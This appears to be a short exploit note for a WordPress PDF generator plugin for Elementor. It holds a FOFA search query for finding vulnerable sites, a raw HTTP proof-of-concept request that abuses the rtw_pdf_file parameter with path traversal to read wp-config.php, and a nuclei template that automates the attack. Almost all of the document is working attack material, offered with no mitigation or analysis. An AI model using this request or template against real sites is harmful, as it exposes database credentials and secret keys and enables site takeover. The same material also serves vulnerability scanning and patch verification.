# fofa

```plain
"wp-content/plugins/pdf-generator-addon-for-elementor-page-builder"
```

# POC

```http
GET /?rtw_pdf_file=../../../wp-config.php&rtw_generate_pdf=1 HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

# nuclei

```yaml
id: WordPress-rtw-pdf-file-EPB-uploadfile

info:
  name: WordPress-rtw-pdf-file-EPB-uploadfile
  author: zxf
  severity: high
  metadata:
    fofasearch: "wp-content/plugins/pdf-generator-addon-for-elementor-page-builder"

http:
  - raw:
      - |
        GET /?rtw_pdf_file=../../../wp-config.php&rtw_generate_pdf=1 HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"The base configuration for WordPress")
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739269848432-78700499-58e7-4fb6-96bf-acd0902dfbec.png)

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739270106119-d942267a-7fd7-4d0b-a538-4c0001536519.png)

